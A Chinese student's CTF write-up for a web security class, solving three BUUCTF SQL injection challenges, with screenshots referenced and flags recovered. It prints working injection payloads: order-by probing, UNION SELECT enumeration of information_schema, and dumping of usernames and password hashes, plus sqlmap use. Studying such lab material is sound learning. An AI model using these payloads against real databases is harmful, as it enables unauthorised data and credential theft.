# WEB第四节课

[TOC]

----

> 20233001306 张博翔 BX

## [极客大挑战 2019]EasySQL

![image-20240815100640223](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815100640223-1723691581908-8.png)

由于根据题目名称可以知道，是sql注入题，我们这里尝试使用`1'`测试回显情况，发现可以注入

1. `?username=1&password=1' order by 6%23`
2. `?username=1&password=1' order by 3%23`
3. `?username=1&password=1' union select 1,2,3%23`

最后得到--==flag==

![image-20240815101232079](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815101232079-1723691581908-7.png)





----



## BUU SQL COURSE 1

首先我们进入页面发现有==热点==和==登录== 两个入口，我简单的看了看热点中的三个页面，发现没什么，由于是sql题我想着会在登录口提供注入，测试了半天发现没什么响应，于是我回到热点页面寻找一些提示

正常手段没有什么发现，于是我选择抓包尝试

![image-20240815102913873](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815102913873-1723691530771-1.png)

发现这里可能是一个注入口，于是我开始尝试

测试了几个数据发现是有效注入，这里我才用`sqlmap`

![image-20240815105033629](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815105033629-1723691530772-2.png)

发现了登录密码，我这里登录一下试试

759acef6268110172281c9824641399e

得到flag

```
flag{62e98eae-c31c-422a-b0ba-469e84ef2717}
```



### 网上Wp学习

```
暴库：（information_schema,ctftraining,mysql,performance_schema,test,news）
?id=-1 UNION SELECT 1,group_concat(schema_name) from information_schema.schemata

暴表：（admin,contents）
?id=-1 UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema="news"

暴字段：（id,username,password）
?id=-1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name="admin"

暴密码：(983a3f6bc1f3709f9f8997f887ef9803)
?id=-1 UNION SELECT 1,concat(username,0x3a,password) from admin
```

----

## [极客大挑战 2019]LoveSQL

> 这个好像是第一题的升级。。。。
>
> 这个题说实话，做到一半的时候没有思路，上网查了查一些思路

![image-20240815110422925](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240815110422925-1723691555801-5.png)

```
cc906f97ec3f2a44c4263178c47b9f1d
```

1. `1' order by 4#`到四的时候报错，说明字段数是3
2. `1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`
3. `1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#`

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>check</title>
</head>
<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>

<body background='./image/background.jpg' style='background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;'>
					<br><br><br>
<h1 style='font-family:verdana;color:red;text-align:center;'>Login Success!</h1><br><br><br>
					</br>
    <p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！</p></br></br>
<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{c3f12931-47d4-49e7-86d0-39974f48d3a5}'</p>
</body>
</html>
```

得到flag

```
flag{c3f12931-47d4-49e7-86d0-39974f48d3a5}
```

